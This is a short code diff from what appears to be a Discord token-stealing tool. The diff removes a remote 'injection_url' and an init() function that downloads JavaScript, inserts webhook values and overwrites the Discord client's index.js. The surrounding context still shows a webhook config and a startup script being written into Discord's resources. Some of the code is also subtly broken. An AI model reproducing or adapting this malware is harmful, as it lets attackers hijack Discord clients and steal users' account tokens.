@@ -14,7 +14,6 @@ const config = {
   embed_name: 'xill', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1000503297091842149/1070632417880191057/eyes.webp', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/vooxil/stub/main/inject/root.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -440,20 +439,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
     if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
         init();
 })
-async function init() {
-    https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
-        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close();
-        });
-    
-    }).on("error", (err) => {
-        setTimeout(init(), 10000);
-    });
-}
+
 require('${path.join(resourcePath, 'app.asar')}')
 if (fs.existsSync(bdPath)) require(bdPath);`;
     fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
